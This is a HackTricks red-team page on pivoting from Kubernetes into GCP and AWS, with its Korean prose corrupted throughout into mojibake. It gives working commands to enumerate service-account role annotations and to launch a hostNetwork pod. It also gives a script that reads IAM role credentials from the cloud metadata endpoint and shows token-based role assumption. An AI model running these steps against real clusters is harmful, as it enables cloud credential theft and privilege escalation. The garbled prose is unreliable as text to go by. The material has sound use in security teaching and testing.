# Kubernetesì—ì„œ í´ë¼ìš°ë“œë¡œì˜ í”¼ë²—

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ì„** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— ì œì¶œ**í•˜ì„¸ìš”.

</details>

## GCP

GCP ë‚´ì—ì„œ k8s í´ëŸ¬ìŠ¤í„°ë¥¼ ì‹¤í–‰ ì¤‘ì¸ ê²½ìš° í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ GCPì— ì•¡ì„¸ìŠ¤í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ì¼ë°˜ì ìœ¼ë¡œ ë‘ ê°€ì§€ ë°©ë²•ì„ ì‚¬ìš©í•©ë‹ˆë‹¤:

### GCP-SA í‚¤ë¥¼ ì‹œí¬ë¦¿ìœ¼ë¡œ ë§ˆìš´íŠ¸

**kubernetes ì• í”Œë¦¬ì¼€ì´ì…˜ì— GCP ì•¡ì„¸ìŠ¤**ë¥¼ ì œê³µí•˜ëŠ” ì¼ë°˜ì ì¸ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* GCP ì„œë¹„ìŠ¤ ê³„ì • ìƒì„±
* ì›í•˜ëŠ” ê¶Œí•œì„ ê³„ì •ì— ë°”ì¸ë”©
* ìƒì„±ëœ SAì˜ json í‚¤ ë‹¤ìš´ë¡œë“œ
* í•´ë‹¹ í‚¤ë¥¼ pod ë‚´ë¶€ì— ì‹œí¬ë¦¿ìœ¼ë¡œ ë§ˆìš´íŠ¸
* GOOGLE\_APPLICATION\_CREDENTIALS í™˜ê²½ ë³€ìˆ˜ë¥¼ json íŒŒì¼ì˜ ê²½ë¡œë¡œ ì„¤ì •

{% hint style="warning" %}
ë”°ë¼ì„œ, **ê³µê²©ì**ë¡œì„œ, pod ë‚´ë¶€ì˜ ì»¨í…Œì´ë„ˆë¥¼ ì¹¨íˆ¬í•˜ë©´ í•´ë‹¹ **env** **ë³€ìˆ˜**ì™€ GCP ìê²© ì¦ëª…ì„ ê°€ì§„ **json** **íŒŒì¼**ì„ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}

### GSA jsonì„ KSA ì‹œí¬ë¦¿ê³¼ ê´€ë ¨ì‹œí‚¤ê¸°

GSAì— ëŒ€í•œ GKE í´ëŸ¬ìŠ¤í„°ì˜ ì•¡ì„¸ìŠ¤ë¥¼ ì œê³µí•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ì´ ë°”ì¸ë”©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:

* ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ GKE í´ëŸ¬ìŠ¤í„°ì™€ ë™ì¼í•œ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— Kubernetes ì„œë¹„ìŠ¤ ê³„ì • ìƒì„±:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* GKE í´ëŸ¬ìŠ¤í„°ì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•˜ë ¤ëŠ” GCP ì„œë¹„ìŠ¤ ê³„ì •ì˜ ìê²© ì¦ëª…ì„ í¬í•¨í•˜ëŠ” Kubernetes Secretì„ ìƒì„±í•©ë‹ˆë‹¤. ë‹¤ìŒ ì˜ˆì‹œì™€ ê°™ì´ `gcloud` ì»¤ë§¨ë“œ ë¼ì¸ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ Kubernetes Secretì„ Kubernetes ì„œë¹„ìŠ¤ ê³„ì •ì— ë°”ì¸ë”©í•©ë‹ˆë‹¤:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
ë‘ ë²ˆì§¸ ë‹¨ê³„ì—ì„œëŠ” GSAì˜ ìê²© ì¦ëª…ì„ KSAì˜ ë¹„ë°€ë¡œ ì„¤ì •í–ˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ GKE í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì—ì„œ í•´ë‹¹ ë¹„ë°€ì„ ì½ì„ ìˆ˜ ìˆë‹¤ë©´ í•´ë‹¹ GCP ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ ìŠ¹ê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### GKE Workload Identity

Workload Identityë¥¼ ì‚¬ìš©í•˜ë©´ Kubernetes ì„œë¹„ìŠ¤ ê³„ì •ì„ Google ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ êµ¬ì„±í•˜ì—¬ Google Cloud APIì— ì•¡ì„¸ìŠ¤í•  ë•Œ Kubernetes ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” Podê°€ ìë™ìœ¼ë¡œ Google ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ ì¸ì¦ë©ë‹ˆë‹¤.

ì´ ë™ì‘ì„ í™œì„±í™”í•˜ê¸° ìœ„í•œ **ì²« ë²ˆì§¸ ì¼ë ¨ì˜ ë‹¨ê³„**ëŠ” GCPì—ì„œ **Workload Identityë¥¼ í™œì„±í™”**í•˜ê³  k8sê°€ ê°€ì¥ìë¦¬ë¥¼ ìœ„ì¥í•  GCP SAë¥¼ ìƒì„±í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

* ìƒˆ í´ëŸ¬ìŠ¤í„°ì—ì„œ **Workload Identityë¥¼ í™œì„±í™”**í•©ë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
* **ìƒˆë¡œìš´ ë…¸ë“œ í’€ ìƒì„±/ì—…ë°ì´íŠ¸** (Autopilot í´ëŸ¬ìŠ¤í„°ëŠ” ì´ë¥¼ í•„ìš”ë¡œí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* K8sì—ì„œ GCP ê¶Œí•œì„ ê°€ì§„ **GCP ì„œë¹„ìŠ¤ ê³„ì •ì„ ìœ„ì¡°**í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **í´ëŸ¬ìŠ¤í„°**ì— **ì—°ê²°**í•˜ê³  ì‚¬ìš©í•  **ì„œë¹„ìŠ¤ ê³„ì •**ì„ **ìƒì„±**í•©ë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **GSAì™€ KSAë¥¼ ë°”ì¸ë”©í•©ë‹ˆë‹¤.**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* **KSA**ì™€ í•¨ê»˜ **pod**ë¥¼ ì‹¤í–‰í•˜ê³  **GSA**ì— ëŒ€í•œ **ì ‘ê·¼**ì„ í™•ì¸í•©ë‹ˆë‹¤:
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ í•„ìš”í•œ ê²½ìš° ì¸ì¦í•˜ì„¸ìš”:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
K8s ë‚´ë¶€ì˜ ê³µê²©ìë¡œì„œ, GCPì—ì„œ ë¬´ì–¸ê°€ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ê²ƒì„ ë‚˜íƒ€ë‚´ëŠ” **`iam.gke.io/gcp-service-account` ì£¼ì„**ì„ ê°€ì§„ **SAsë¥¼ ì°¾ì•„ì•¼** í•©ë‹ˆë‹¤. ë˜ ë‹¤ë¥¸ ì˜µì…˜ì€ í´ëŸ¬ìŠ¤í„° ë‚´ì˜ ê° KSAë¥¼ ë‚¨ìš©í•˜ê³  ì ‘ê·¼í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.\
GCPì—ì„œëŠ” í•­ìƒ ë°”ì¸ë”©ì„ ì—´ê±°í•˜ê³  Kubernetes ë‚´ë¶€ì˜ SAsì—ê²Œ ì–´ë–¤ ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ”ì§€ ì•Œì•„ë‚´ëŠ” ê²ƒì´ í¥ë¯¸ë¡œìš¸ ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

ë‹¤ìŒì€ ì´ **ì£¼ì„ì„ ì°¾ê¸° ìœ„í•´ ëª¨ë“  pod ì •ì˜ë¥¼ ì‰½ê²Œ ë°˜ë³µí•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸**ì…ë‹ˆë‹¤:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (Podsìš© IAM ì—­í• ) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Podsì— IAM ì—­í• ì„ ë¶€ì—¬í•˜ëŠ” (ì˜¤ë˜ëœ) ë°©ë²•ì€ [**Kiam**](https://github.com/uswitch/kiam) ë˜ëŠ” [**Kube2IAM**](https://github.com/jtblin/kube2iam) **ì„œë²„**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ **íŠ¹ê¶Œì´ ìˆëŠ” IAM ì—­í• **ì„ ê°€ì§„ **ë°ëª¬ì…‹**ì„ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ì´ ë°ëª¬ì…‹ì€ í•„ìš”í•œ íŒŸì— IAM ì—­í• ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•  ê²ƒì…ë‹ˆë‹¤.

ë¨¼ì €, **ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë‚´ì—ì„œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ì—­í• ì„ êµ¬ì„±**í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ê°ì²´ ë‚´ì— ì£¼ì„ì„ ì‚¬ìš©í•˜ì—¬ êµ¬ì„±í•©ë‹ˆë‹¤:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

ë„¤ì„ìŠ¤í˜ì´ìŠ¤ê°€ IAM ì—­í• ë¡œ êµ¬ì„±ë˜ë©´ PodëŠ” ë‹¤ìŒê³¼ ê°™ì´ ê° Pod ì •ì˜ì— ì›í•˜ëŠ” ì—­í• ì„ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
ê³µê²©ìë¡œì„œ, ë§Œì•½ íŒŸì´ë‚˜ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë˜ëŠ” kube-systemì—ì„œ ì‹¤í–‰ ì¤‘ì¸ kiam/kube2iam ì„œë²„ì—ì„œ ì´ëŸ¬í•œ ì£¼ì„ì„ ì°¾ìœ¼ë©´, ì´ë¯¸ íŒŸë“¤ì— ì˜í•´ ì‚¬ìš©ë˜ëŠ” ëª¨ë“  ì—­í• ê³¼ ë”ë¶ˆì–´ (AWS ê³„ì •ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ê²½ìš°) ë” ë§ì€ ì—­í• ì„ ê°€ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

#### IAM ì—­í• ì„ ì‚¬ìš©í•˜ì—¬ íŒŸ ìƒì„±

{% hint style="info" %}
ì§€ì •í•´ì•¼ í•˜ëŠ” IAM ì—­í• ì€ kiam/kube2iam ì—­í• ê³¼ ë™ì¼í•œ AWS ê³„ì •ì— ìˆì–´ì•¼ í•˜ë©°, í•´ë‹¹ ì—­í• ì´ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### OIDCë¥¼ í†µí•œ K8s ì„œë¹„ìŠ¤ ê³„ì •ìš© IAM ì—­í•  <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

ì´ê²ƒì€ AWSì—ì„œ **ê¶Œì¥í•˜ëŠ” ë°©ë²•**ì…ë‹ˆë‹¤.

1. ë¨¼ì € í´ëŸ¬ìŠ¤í„°ì— ëŒ€í•œ [OIDC ê³µê¸‰ìë¥¼ ìƒì„±](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html)í•´ì•¼ í•©ë‹ˆë‹¤.
2. ê·¸ëŸ° ë‹¤ìŒ SAê°€ í•„ìš”ë¡œ í•˜ëŠ” ê¶Œí•œì„ ê°€ì§„ IAM ì—­í• ì„ ìƒì„±í•©ë‹ˆë‹¤.
3. IAM ì—­í• ê³¼ SA ê°„ì— [ì‹ ë¢° ê´€ê³„ë¥¼ ìƒì„±](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html)í•©ë‹ˆë‹¤. ì´ë•Œ IAM ì—­í• ê³¼ SAì˜ ì´ë¦„(ë˜ëŠ” ì—­í• ì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ëª¨ë“  ë„¤ì„ìŠ¤í˜ì´ìŠ¤)ì„ í™•ì¸í•©ë‹ˆë‹¤. _ì‹ ë¢° ê´€ê³„ëŠ” ì£¼ë¡œ OIDC ê³µê¸‰ì ì´ë¦„, ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ì´ë¦„ ë° SA ì´ë¦„ì„ í™•ì¸í•©ë‹ˆë‹¤_.
4. ë§ˆì§€ë§‰ìœ¼ë¡œ, **IAM ì—­í• ì˜ ARNì„ ë‚˜íƒ€ë‚´ëŠ” ì£¼ì„ì´ ìˆëŠ” SAë¥¼ ìƒì„±**í•˜ë©´ í•´ë‹¹ SAë¡œ ì‹¤í–‰ë˜ëŠ” íŒŸì€ **ì—­í• ì˜ í† í°ì— ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **í† í°**ì€ **íŒŒì¼ì— ê¸°ë¡**ë˜ë©° ê²½ë¡œëŠ” **`AWS_WEB_IDENTITY_TOKEN_FILE`**(ê¸°ë³¸ê°’: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)ì— ì§€ì •ë©ë‹ˆë‹¤.
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
`/var/run/secrets/eks.amazonaws.com/serviceaccount/token`ì—ì„œ í† í°ì„ ì‚¬ìš©í•˜ì—¬ awsë¥¼ ì–»ìœ¼ë ¤ë©´ ë‹¤ìŒì„ ì‹¤í–‰í•˜ì‹­ì‹œì˜¤:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
ê³µê²©ìë¡œì„œ, K8s í´ëŸ¬ìŠ¤í„°ë¥¼ ì—´ê±°í•  ìˆ˜ ìˆë‹¤ë©´, **í•´ë‹¹ ì£¼ì„ì´ ìˆëŠ” ì„œë¹„ìŠ¤ ê³„ì •**ì„ í™•ì¸í•˜ì—¬ **AWSë¡œ ìŠ¹ê²©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´, IAM **íŠ¹ê¶Œ ì„œë¹„ìŠ¤ ê³„ì •** ì¤‘ í•˜ë‚˜ë¥¼ ì‚¬ìš©í•˜ì—¬ **íŒŸì„ ì‹¤í–‰/ìƒì„±**í•˜ê³  í† í°ì„ ë„ìš©í•˜ë©´ ë©ë‹ˆë‹¤.

ë˜í•œ, íŒŸ ë‚´ë¶€ì— ìˆëŠ” ê²½ìš°, **AWS\_ROLE\_ARN** ë° **AWS\_WEB\_IDENTITY\_TOKEN**ê³¼ ê°™ì€ í™˜ê²½ ë³€ìˆ˜ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.
{% endhint %}

{% hint style="danger" %}
ì¼ë¶€ ê²½ìš°ì—ëŠ” ì—­í• ì˜ **ì‹ ë¢° ì •ì±…**ì´ **ì˜ëª» êµ¬ì„±**ë˜ì–´, ì˜ˆìƒëœ ì„œë¹„ìŠ¤ ê³„ì •ì— ëŒ€í•œ AssumeRole ì•¡ì„¸ìŠ¤ ëŒ€ì‹  **ëª¨ë“  ì„œë¹„ìŠ¤ ê³„ì •**ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, ì œì–´ëœ ì„œë¹„ìŠ¤ ê³„ì •ì— ì£¼ì„ì„ ì‘ì„±í•  ìˆ˜ ìˆë‹¤ë©´ ì—­í• ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ë‚´ìš©ì€ **ë‹¤ìŒ í˜ì´ì§€ë¥¼ ì°¸ì¡°**í•˜ì‹­ì‹œì˜¤:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ IAM ì—­í• ì„ ê°€ì§„ íŒŸ ë° SAs ì°¾ê¸°

ë‹¤ìŒì€ **ëª¨ë“  íŒŸê³¼ sas** ì •ì˜ë¥¼ **ë°˜ë³µ**í•˜ì—¬ í•´ë‹¹ **ì£¼ì„**ì„ ì°¾ëŠ” ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### ë…¸ë“œ IAM ì—­í• 

ì´ì „ ì„¹ì…˜ì—ì„œëŠ” íŒŸì„ ì‚¬ìš©í•˜ì—¬ IAM ì—­í• ì„ ë„ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì„¤ëª…í–ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ K8s í´ëŸ¬ìŠ¤í„°ì˜ **ë…¸ë“œëŠ” í´ë¼ìš°ë“œ ë‚´ì˜ ì¸ìŠ¤í„´ìŠ¤**ê°€ ë  ê²ƒì…ë‹ˆë‹¤. ì´ëŠ” ë…¸ë“œê°€ **ë„ë‚œë‹¹í•  ìˆ˜ ìˆëŠ” ìƒˆë¡œìš´ IAM ì—­í• ì„ ê°€ì§€ê³  ìˆì„ ê°€ëŠ¥ì„±ì´ ë§¤ìš° ë†’ë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸**í•©ë‹ˆë‹¤ (_ì¼ë°˜ì ìœ¼ë¡œ K8s í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  ë…¸ë“œëŠ” ë™ì¼í•œ IAM ì—­í• ì„ ê°€ì§€ë¯€ë¡œ ê° ë…¸ë“œë¥¼ í™•ì¸í•˜ëŠ” ê²ƒì€ ê°€ì¹˜ê°€ ì—†ì„ ìˆ˜ë„ ìˆìŒì„ ìœ ì˜í•˜ì„¸ìš”_).

ê·¸ëŸ¬ë‚˜ ë…¸ë“œì—ì„œ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì— ì•¡ì„¸ìŠ¤í•˜ê¸° ìœ„í•´ì„œëŠ” ë…¸ë“œì— ìˆì–´ì•¼ í•©ë‹ˆë‹¤ (ssh ì„¸ì…˜?) ë˜ëŠ” ì ì–´ë„ ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ì— ìˆì–´ì•¼ í•©ë‹ˆë‹¤:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### IAM ì—­í•  í† í° ë„ìš©

ì´ì „ì—ëŠ” **IAM ì—­í• ì„ Podì— ì—°ê²°í•˜ëŠ” ë°©ë²•**ì´ë‚˜ ì¸ìŠ¤í„´ìŠ¤ì— ì—°ê²°ëœ IAM ì—­í• ì„ ë„ìš©í•˜ê¸° ìœ„í•´ **ë…¸ë“œë¡œ íƒˆì¶œí•˜ëŠ” ë°©ë²•**ì— ëŒ€í•´ ë…¼ì˜í–ˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡­ê²Œ ì‘ì„±í•œ **IAM ì—­í•  ìê²© ì¦ëª…ì„ ë„ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## ì°¸ê³  ìë£Œ

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ì„** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
